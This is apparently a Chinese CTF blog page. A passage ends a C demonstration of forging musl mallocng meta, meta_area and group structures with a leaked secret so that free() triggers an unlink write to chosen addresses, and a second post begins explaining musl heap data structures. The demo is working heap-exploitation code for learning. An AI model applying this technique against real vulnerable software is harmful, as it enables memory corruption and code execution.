chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;\n接下来让我们用源码中给出的寻找chunk所在meta的方法回溯这些chunk所在的group和meta。\n&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">groups</span>[14];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">metas</span>[14];</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++)&#123;</span><br><span class="line">        groups[i] = get_group(chunks[i]);</span><br><span class="line">        metas[i] = get_meta(chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++)&#123;</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;第&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> GREEN <span class="string">&quot;m%d\033[0m&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;次malloc获得chunk的group地址和meta地址分别为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p %p\n\033[0m&quot;</span>, groups[i], metas[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;通过nontrivial_free中的dequeue函数进行unlink，首先要通过get_meta函数的重重检查：\n\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/meta.h, line 129)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static inline struct meta *get_meta(const unsigned char *p)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!((uintptr_t)p &amp; 15));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint offset = *(const uint16_t *)(p - 2);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint index = get_slot_index(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (p[-4]) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(!offset);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\toffset = *(uint32_t *)(p - 8);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &gt; 0xffff);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct group *base = (const void *)(p - UNIT*offset - UNIT);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct meta *meta = base-&gt;meta;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(meta-&gt;mem == base);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(index &lt;= meta-&gt;last_idx);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tconst struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tassert(area-&gt;check == ctx.secret);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (meta-&gt;sizeclass &lt; 48) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(meta-&gt;sizeclass == 63);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (meta-&gt;maplen) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn (struct meta *)meta;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面我们逐一查看一下这些检查的具体内容。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;1. meta-&gt;mem == base，即meta中保存的group指针要正确。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;2. index &lt;= meta-&gt;last_idx，即chunk的索引不能越界。\n&quot;</span>);</span><br><span class="line">    printf_color(RED   , HIGHLIGHT, <span class="string">&quot;3. area-&gt;check == ctx.secret，即meta所在的meta_area的校验值正确。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;4. offset &gt;= size_classes[meta-&gt;sizeclass]*index\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;5. offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)，这两个检查offset和chunk大小是否对应。\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;6. assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);，即检查offset是否越界。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这些检查之中对我们最为重要的就是校验值的检查。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;只有泄露出secret值，我们才能释放伪造meta_area中伪造meta的group的chunk。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span>* <span class="title">area</span> =</span> get_meta_area(metas[<span class="number">0</span>]);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;上面分配的所有meta均在同一个meta_area中，地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\n\033[0m&quot;</span>, area);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以由此获取到secret的值为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%#llx\n\n\033[0m&quot;</span>, area-&gt;check);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> secret = area-&gt;check;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来我们来伪造chunk以及其上的结构。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* mmap_space = mmap((<span class="type">void</span>*)<span class="number">0xdeadbeef000</span>, <span class="number">0x2000</span>, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span>* <span class="title">fake_meta_area</span> =</span> mmap_space;</span><br><span class="line">    fake_meta_area-&gt;check = secret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">fake_meta</span> =</span> (<span class="keyword">struct</span> meta*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x100</span>);</span><br><span class="line">    fake_meta-&gt;maplen = <span class="number">1</span>;</span><br><span class="line">    fake_meta-&gt;sizeclass = <span class="number">7</span>;       <span class="comment">// group中保存的chunk大小，这里设置为0x80</span></span><br><span class="line">    fake_meta-&gt;last_idx = <span class="number">4</span>;        <span class="comment">// group中chunk的总数，这里设置为4表示chunk总数为5</span></span><br><span class="line">    fake_meta-&gt;freeable = <span class="number">1</span>;        <span class="comment">// 通过okay_to_free检查</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">fake_group</span> =</span> (<span class="keyword">struct</span> group*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x1000</span>);</span><br><span class="line">    fake_meta-&gt;mem = fake_group;    <span class="comment">// 通过检查1</span></span><br><span class="line">    fake_group-&gt;meta = fake_meta;   <span class="comment">// 使group能够找到meta</span></span><br><span class="line">    fake_meta-&gt;avail_mask = <span class="number">0b11101</span>;<span class="comment">// 使nontrivial_free进入if循环，得以执行dequeue</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* fake_chunk = (<span class="type">char</span>*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) mmap_space + <span class="number">0x1000</span> + <span class="number">0x10</span> + <span class="number">0x80</span>);</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">short</span> *)(fake_chunk - <span class="number">2</span>) = <span class="number">8</span>;    <span class="comment">// offset</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">char</span>*)(fake_chunk - <span class="number">3</span>) = <span class="number">1</span>;      <span class="comment">// index</span></span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;绕过第1个检查，只需要设置meta中的group指针为假group指针即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;第2个检查需要正确设置chunk的index值，本程序释放的是group中第2个chunk，因此索引为1。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;注意索引值存放的位置，是chunk地址-3这个字节。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;第3个检查需要我们提前泄露secret的值，并填写到meta_area中。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;检查4和5只需要正确计算chunk的大小，填写chunk的索引值即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序尝试释放sizeclass=7的chunk，即chunk大小为0x80，因此第2个chunk的索引为0x80&gt;&gt;4=8。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;索引值index保存在chunk的前面两个字节中，正确填入即可。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;正确设置index后，检查6一般也是没有问题的。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在通过get_meta的检查后，还需要通过nontrivial_free中的if语句条件判断。\n\n&quot;</span>);</span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/free.c, line 72)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static struct mapinfo nontrivial_free(struct meta *g, int i)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tuint32_t self = 1u&lt;&lt;i;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint sc = g-&gt;sizeclass;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tuint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\033[1;31mif (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g))\033[1;&quot;</span> PURPLE <span class="string">&quot;m &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// any multi-slot group is necessarily on an active list\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// here, but single-slot groups might or might not be.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tif (g-&gt;next) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tassert(sc &lt; 48);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tint activate_new = (ctx.active[sc]==g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tdequeue(&amp;ctx.active[sc], g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tif (activate_new &amp;&amp; ctx.active[sc])\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\tactivate_group(ctx.active[sc]);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\treturn free_group(g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else if (!mask) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tassert(sc &lt; 48);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// might still be active if there were no allocations\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// after last available slot was taken.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tif (ctx.active[sc] != g) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\tqueue(&amp;ctx.active[sc], g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\ta_or(&amp;g-&gt;freed_mask, self);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn (struct mapinfo)&#123; 0 &#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;只需要修改meta中的freeable字段为1即可通过该检查。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;最后还需要在free_group中进入正确的else分支：\n\n&quot;</span>);</span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;(/src/malloc/mallocng/free.c, line 14)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static struct mapinfo free_group(struct meta *g)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tstruct mapinfo mi = &#123; 0 &#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tint sc = g-&gt;sizeclass;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (sc &lt; 48) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tctx.usage_by_class[sc] -= g-&gt;last_idx+1;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tif (g-&gt;maplen) &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tstep_seq();\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\trecord_seq(sc);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi.base = g-&gt;mem;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi.len = g-&gt;maplen*4096UL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125; else &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tvoid *p = g-&gt;mem;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tstruct meta *m = get_meta(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tint idx = get_slot_index(p);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tg-&gt;mem-&gt;meta = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t// not checking size/reserved here; it&#x27;s intentionally invalid\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\tmi = nontrivial_free(m, idx);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tfree_meta(g);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn mi;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这需要我们设置meta-&gt;maplen为非零值，防止再次进入nontrivial_free。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;这里的maplen就设置为group占用的页数量即可。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来我们向meta的两个链表指针写入事先准备好的地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;meta-&gt;prev写入：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\033[0m\n&quot;</span>, victim_1);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;meta-&gt;next写入：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> YELLOW <span class="string">&quot;m%p\033[0m\n&quot;</span>, victim_2);</span><br><span class="line"></span><br><span class="line">    fake_meta-&gt;prev = (<span class="keyword">struct</span> meta*)victim_1;</span><br><span class="line">    fake_meta-&gt;next = (<span class="keyword">struct</span> meta*)victim_2;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面调用free函数释放这个假chunk。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(fake_chunk);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;释放后，目标地址附近的值已经被成功修改：\n&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)victim_1, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这证明使用一个假chunk修改两个地址的值是可行的，在free之后，chunk所在的页被释放了，这样就不会对接下来的进一步利用造成其他任何影响了。</p>
<p>为了利用unlink，我们需要构造很多东西，不能落下其中任何一个，在解题与学习时要特别注意。在下一篇文章中笔者将会分析unlink如何与FILE结构体配合，从而最终getshell。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-1/" class="post-title-link" itemprop="url">musl pwn 入门 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:39:21" itemprop="dateCreated datePublished" datetime="2023-02-28T22:39:21+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/musl-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">musl pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>近年来，musl libc作为一个轻量级的libc越来越多地出现在CTF pwn题之中，其和glibc相比有一定的差距，因此本文我们就musl libc最常考的考点——内存分配，进行musl libc的源代码审计。</p>
<p>不同于glibc多达四五千行代码，大小超过10w字节的malloc.c，musl libc中的malloc.c大小甚至都不到1w字节，其轻量级的特性也使得我们更加容易去阅读它的代码。</p>
<p>musl libc在内存分配上经历过一次大的改动（1.2.0-&gt;1.2.1），本文针对发文时的最新版本1.2.3进行分析。</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-269533.htm#msg_header_h3_6">传送门</a></p>
<h1 id="1-主要数据结构"><a class="markdownIt-Anchor" href="#1-主要数据结构"></a> 1. 主要数据结构</h1>
<h2 id="malloc_context"><a class="markdownIt-Anchor" href="#malloc_context"></a> malloc_context</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">	<span class="type">uint64_t</span> secret;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">	<span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">int</span> init_done;</span><br><span class="line">	<span class="type">unsigned</span> mmap_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line">	<span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line">	<span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line">	<span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">	<span class="type">uint8_t</span> seq;</span><br><span class="line">	<span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这个结构体是musl libc的堆管理最上层结构，其中字段的含义分别为：</p>
<ul>
<li><code>uint64_t secret</code>：一个随机生成的数，用于检查<code>meta</code>的合法性，也即一个check guard</li>
<li><code>size_t pagesize</code>：页大小，在x86_64下一般为为0x1000</li>
<li><code>int init_done</code>：判断<code>malloc_context</code>是否初始化完成，在<code>alloc_meta</code>函数中进行检查，如果没有则进行初始化，否则跳过初始化流程</li>
<li><code>unsigned mmap_counter</code>：mmap计数器，通过mmap分配了多少次空间用于内存分配</li>
<li><code>struct meta *free_meta_head</code>：被释放的<code>meta</code>结构体构成的链表表头，<code>meta</code>结构体是musl libc内存分配的低一级结构，后面会提到</li>
<li><code>struct meta *avail_meta</code>：空闲的<code>meta</code>结构体构成的链表表头</li>
<li><code>size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift</code>：
<ul>
<li><code>size_t avail_meta_count</code>：空闲<code>meta</code>的数量</li>
<li><code>size_t avail_meta_area_count</code>：空闲<code>meta_area</code>的数量，<code>meta_area</code>是<code>meta</code>的控制结构</li>
<li><code>size_t meta_alloc_shift</code>：&lt;暂缺&gt;</li>
</ul>
</li>
<li><code>struct meta_area *meta_area_head, *meta_area_tail</code>：<code>meta_area</code>链表表头，链表表尾</li>
<li><code>unsigned char *avail_meta_areas</code>：&lt;暂缺&gt;</li>
<li><code>struct meta *active[48]</code>：可以继续分配的<code>meta</code></li>
<li><code>size_t usage_by_class[48]</code>：对应大小的缓存的所有<code>meta</code>的<code>group</code>所管理的chunk个数</li>
<li><code>uint8_t unmap_seq[32], bounces[32]</code>：&lt;暂缺&gt;</li>
<li><code>uint8_t seq</code>：&lt;暂缺&gt;</li>
<li><code>uintptr_t brk</code>：记录目前的<code>brk(0)</code></li>
</ul>
<p>其中有一些字段无法通过简单查看代码得到，需要进一步代码审计获取其含义，我们后面再进行补充。</p>
<h2 id="meta_area"><a class="markdownIt-Anchor" href="#meta_area"></a> meta_area</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">	<span class="type">uint64_t</span> check;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">int</span> nslots;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这个结构用于管理一页内的所有<code>meta</code>结构，属于<code>malloc_context</code>的下级结构，<code>meta</code>的上级结构。</p>
<ul>
<li><code>uint64_t check</code>：检查字段，与<code>malloc_context</code>中的<code>secret</code>字段对应，检查该<code>meta_area</code>是否可能被修改</li>
<li><code>struct meta_area *next</code>：下一个<code>meta_area</code>的地址，构成链表</li>
<li><code>int nslots</code>：该<code>meta_area</code>中管理的<code>meta</code>数量，一般为固定值</li>
<li><code>struct meta slots[]</code>：管理的<code>meta</code>数组</li>
</ul>
<h2 id="meta"><a class="markdownIt-Anchor" href="#meta"></a> meta</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">	<span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">	<span class="type">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">	<span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">	<span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>meta</code>中保存有<code>group</code>结构体指针，后者直接保存有需要分配的内存块。即<code>meta</code>和其管理的内存块可能不在同一个page中。</p>
<ul>
<li><code>struct meta *prev, *next</code>：前后<code>meta</code>，构成双向链表</li>
<li><code>struct group *mem</code>：管理的<code>group</code>结构体指针</li>
<li><code>volatile int avail_mask, freed_mask</code>：掩码的形式，用一个bit表示存在与否</li>
<li><code>uintptr_t last_idx:5</code>：该<code>meta</code>中最后一个chunk的索引</li>
<li><code>freeable:1</code>：该<code>meta</code>中的chunk是否能够被释放</li>
